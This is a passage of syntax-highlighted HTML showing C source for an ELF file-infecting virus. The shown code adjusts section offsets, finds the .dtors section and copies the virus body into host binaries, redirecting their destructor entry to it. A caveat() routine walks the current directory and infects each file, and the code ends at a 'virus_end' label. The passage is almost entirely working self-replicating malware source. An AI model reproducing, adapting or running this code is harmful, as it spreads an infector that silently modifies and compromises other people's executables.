        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dp</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shoff</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">vo</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shoff</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">Elf32_Shdr</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">shdr</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">Elf32_Shdr</span><span class="sc10">*)(</span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shoff</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">strtab</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">[</span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shstrndx</span><span class="sc10">].</span><span class="sc11">sh_offset</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">dtors</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'d'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'t'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'o'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'r'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'s'</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
        </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">ehdr</span><span class="sc10">-&gt;</span><span class="sc11">e_shnum</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++,</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">++)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">dp</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">&gt;=</span><span class="sc0"> </span><span class="sc11">vo</span><span class="sc10">)</span><span class="sc0">
                        </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">tp</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">dp</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(!</span><span class="sc0"> </span><span class="sc11">strcmp</span><span class="sc10">(</span><span class="sc11">strtab</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">dtors</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">uint32_t</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">t</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">uint32_t</span><span class="sc10">*)(</span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_offset</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">shdr</span><span class="sc10">-&gt;</span><span class="sc11">sh_size</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">t</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">memcpy</span><span class="sc10">(</span><span class="sc11">m</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">vo</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc19">size</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">*</span><span class="sc11">t</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">ve</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">goto</span><span class="sc0"> </span><span class="sc11">error2</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">__attribute__</span><span class="sc10">((</span><span class="sc11">used</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc11">caveat</span><span class="sc10">(</span><span class="sc16">void</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">dot</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc7">'.'</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\0'</span><span class="sc0"> </span><span class="sc10">};</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">[</span><span class="sc4">256</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">h</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">self</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">__builtin_return_address</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">h</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">dot</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">readdir</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">d</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc11">d</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">self</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">h</span><span class="sc10">);</span><span class="sc0">
    
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">asm</span><span class="sc10">(</span><span class="sc6">"virus_end:"</span><span class="sc10">);</span><span class="sc0">
</span></div></body>
</html>
